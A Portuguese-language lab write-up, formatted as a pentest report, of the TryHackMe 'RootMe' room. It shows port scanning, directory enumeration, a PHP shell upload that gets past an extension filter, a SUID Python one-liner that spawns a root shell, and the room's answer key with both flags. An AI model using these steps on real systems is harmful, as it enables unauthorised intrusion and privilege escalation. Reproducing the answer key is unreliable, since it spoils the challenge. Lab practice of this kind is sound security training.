# Relatório de Pentest - [RootMe](https://tryhackme.com/room/rrootme)

## Informações Gerais

- **Data do Teste:** 06/10/2023
- **Autor:** Gabriel Godoy

## Descrição

Este é um relatório de pentest da sala "RootMe", realizada em 06/10/2023. O objetivo deste teste era identificar vulnerabilidades em um servidor e explorá-las para obter acesso às flags do usuário e root.

## Comandos Utilizados

Durante o teste, foram utilizados os seguintes comandos:

1. Identificação de portas abertas:
   - `nmap 10.10.30.68`
   - 22/tcp open  ssh
   - 80/tcp open  http

2. Detalhes de serviços nas portas abertas:
   - `nmap -sV -p 22,80 10.10.30.68`
   - 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   - 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

3. Enumeração de diretórios:
   - `gobuster dir -u 10.10.30.68 -w /usr/share/dirb/wordlists/big.txt -t 100 -e -x txt,php,html`
   - /css                  (Status: 301)
   - /index.php            (Status: 200)
   - /js                   (Status: 301)
   - /panel                (Status: 301)
   - /uploads              (Status: 301)

4. Busca por arquivos `user.txt`:
   - `find / -type f -name user.txt 2> /dev/null`
   - `cat user.txt`

5. Identificação de binários com permissões SUID:
   - `find / -user root -perm /4000`
   - `/usr/bin/python`

6. Escalonamento de privilégios:
   - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
   - `whoami`
   - `find / -type f -name root.txt`
   - `cat root.txt`

## Vulnerabilidades Exploradas

Durante o teste, as seguintes vulnerabilidades foram encontradas e exploradas:

1. Shell PHP enviada para /panel, com renomeação para php5.
   - Vulnerabilidade: Falha de segurança permitindo upload de shell.

   Enviando uma shell PHP em /panel, o arquivo PHP não foi aceito, então foi necessário renomear para php5. Em /uploads, foi possível verificar que a shell foi enviada com sucesso.

2. Uso de binário Python com permissões SUID.
   - Vulnerabilidade: Escalonamento de privilégios.

## Conclusões

Este teste identificou vulnerabilidades no servidor, incluindo a possibilidade de upload de shell e escalonamento de privilégios através do binário Python com permissões SUID. A exploração dessas vulnerabilidades permitiu o acesso às flags do usuário e root.

É importante destacar a importância da correção de vulnerabilidades e da aplicação de medidas de segurança para proteger os sistemas contra explorações.

## Assinatura

Gabriel Godoy - Penetration Tester
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
<details><summary>Respostas do desafio/room</summary>

1. **2**
2. **2.4.29**
3. **ssh**
4. **/panel/**
5. **THM{y0u_g0t_a_sh3ll}**
6. **/usr/bin/python**
7. **THM{pr1v1l3g3_3sc4l4t10n}**

</details>
